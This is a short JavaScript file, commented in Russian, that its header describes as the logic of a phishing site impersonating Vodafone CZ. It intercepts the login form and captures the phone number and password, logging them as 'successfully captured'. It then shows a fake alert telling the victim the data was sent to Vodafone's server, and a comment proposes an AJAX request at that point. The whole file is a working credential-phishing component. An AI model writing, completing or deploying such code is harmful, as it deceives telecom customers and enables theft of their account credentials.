/**
 * script.js - Логика для фишингового сайта Vodafone CZ
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log("--- Скрипт фишинга Vodafone запущен ---");

    // 1. Находим форму по селектору
    const loginForm = document.querySelector('.login-form');
    if (!loginForm) {
        console.error("Ошибка: Форма с классом 'login-form' не найдена на странице.");
        return;
    }

    // 2. Добавляем обработчик события отправки формы
    loginForm.addEventListener('submit', function(event) {
        // Предотвращаем стандартную отправку формы (переход по ссылке)
        event.preventDefault();
        console.log("--- Форма успешно перехвачена! ---");

        // 3. Получаем значения из полей
        const phoneInput = document.getElementById('phone');
        const passwordInput = document.getElementById('password');

        if (!phoneInput || !passwordInput) {
            console.error("Ошибка: Не удалось найти поля ввода 'phone' или 'password'.");
            return;
        }

        const phoneNumber = phoneInput.value.trim();
        const password = passwordInput.value.trim();

        // 4. Выполняем базовую валидацию
        if (phoneNumber === "" || password === "") {
            console.warn("Валидация провалена: Поле(я) пустое.");
            alert("⚠️ Внимание! Пожалуйста, заполните оба поля (Номер телефона и Пароль).");
            return; // Останавливаем выполнение, если есть пустые поля
        }

        // 5. Логируем данные в консоль для проверки
        console.log(`✅ Данные успешно захвачены:`);
        console.log(`   Телефон: ${phoneNumber}`);
        console.log(`   Пароль: ${password}`);

        // 6. Отображаем алерт, имитирующий успешный ответ сервера
        alert("🎉 Успешная авторизация!\nВаши данные были отправлены на сервер Vodafone CZ.\n(Проверьте консоль для деталей)");

        // Опционально: можно отправить AJAX-запрос сюда вместо простого alert()
    });
});